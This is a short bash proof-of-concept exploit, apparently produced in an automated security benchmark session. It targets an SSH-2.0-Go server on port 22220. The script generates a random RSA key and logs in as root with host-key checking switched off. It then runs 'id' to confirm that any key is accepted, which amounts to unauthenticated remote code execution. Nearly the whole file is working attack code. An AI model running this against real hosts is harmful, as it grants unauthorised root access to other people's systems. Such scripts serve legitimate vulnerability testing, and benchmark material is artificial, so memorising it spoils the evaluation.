#!/bin/bash
# POC: SSH Public Key Authentication Bypass - Accept Any RSA Key. Demonstrates that the SSH-2.0-Go implementation on port 22220 accepts ANY RSA public key for authentication, bypassing SSH public key authentication and allowing unauthenticated remote code execution.
# Target: ./repo
# Created: 2025-11-07T18:28:08.982Z
# Session: benchmark-XBEN-097-24-mhp6l4fm

# SSH Public Key Authentication Bypass POC
# Demonstrates that SSH-2.0-Go on port 22220 accepts ANY RSA public key

set -e

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-22220}"
TEST_DIR="/tmp/ssh_auth_bypass_$$"

echo "[*] SSH Public Key Authentication Bypass POC"
echo "[*] Target: $TARGET_HOST:$TARGET_PORT"
echo ""

# Create temporary directory for test keys
mkdir -p "$TEST_DIR"
trap "rm -rf $TEST_DIR" EXIT

echo "[+] Step 1: Generating random RSA key pair..."
ssh-keygen -t rsa -b 2048 -N "" -f "$TEST_DIR/test_key" -C "bypass_test" > /dev/null 2>&1
echo "[+] Generated test key: $TEST_DIR/test_key"
echo ""

echo "[+] Step 2: Testing SSH authentication with arbitrary key..."
echo "[+] Attempting to authenticate as 'root' user..."

# Attempt SSH connection with arbitrary key
# Using timeout to prevent hanging, and capturing output
OUTPUT=$(timeout 10 ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PasswordAuthentication=no \
  -o PubkeyAuthentication=yes \
  -i "$TEST_DIR/test_key" \
  -p "$TARGET_PORT" \
  "root@$TARGET_HOST" \
  'id' 2>&1 || true)

echo "[+] SSH Response:"
echo "$OUTPUT"
echo ""

# Check if authentication succeeded
if echo "$OUTPUT" | grep -q "uid="; then
    echo "[!] VULNERABILITY CONFIRMED: Authentication succeeded with arbitrary RSA key!"
    echo "[!] The SSH server accepted the random key without authorization."
    echo "[!] Full RCE achieved - commands executed as user: $(echo "$OUTPUT" | grep -oP 'uid=\d+\(\K[^)]*')"
    exit 0
else
    echo "[-] Authentication attempt failed or unexpected response"
    echo "[-] Response: $OUTPUT"
    exit 1
fi